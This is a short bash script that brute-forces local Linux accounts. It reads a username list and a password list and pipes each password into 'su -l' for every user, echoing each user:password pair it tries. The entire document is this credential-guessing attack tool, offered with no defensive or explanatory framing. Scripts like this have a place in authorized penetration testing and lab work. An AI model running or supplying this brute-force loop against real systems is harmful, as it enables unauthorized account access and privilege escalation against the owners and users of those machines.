#!/bin/bash

# $1 Random Users File
# $2 Random Passwords Files


# Random Users - Random Pass
echo "============================================="
echo "==== Start Random Users - Random Pass ======="
echo "============================================="
while IFS= read -r user; do
    while IFS= read -r pass; do
        echo "Testing $user:$pass"
        echo "$pass" | su -l $user
    done < $2
done < $1
echo "============================================="
echo "===== Done Random Users - Random Pass ======="
echo "============================================="
echo ""
echo ""
echo ""